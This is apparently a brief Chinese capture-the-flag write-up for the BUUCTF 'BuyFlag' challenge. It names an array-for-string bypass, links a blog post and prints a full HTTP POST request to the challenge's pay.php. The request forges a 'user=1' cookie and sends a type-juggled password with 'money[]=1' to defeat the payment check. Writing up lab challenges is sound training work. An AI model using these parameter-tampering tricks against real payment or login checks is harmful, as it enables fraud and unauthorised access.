# 知识点
数组绕过字符串
# 思路
[BUUCTF：[极客大挑战 2019]BuyFlag_末 初的博客-CSDN博客](https://blog.csdn.net/mochu7777777/article/details/109501224)
```php
POST /pay.php HTTP/1.1
Host: 285586c7-21d1-434f-98df-de9058f5ce92.node4.buuoj.cn:81
Content-Length: 24
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://285586c7-21d1-434f-98df-de9058f5ce92.node4.buuoj.cn:81
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://285586c7-21d1-434f-98df-de9058f5ce92.node4.buuoj.cn:81/pay.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: user=1
Connection: close

password=404aa&money[]=1
```
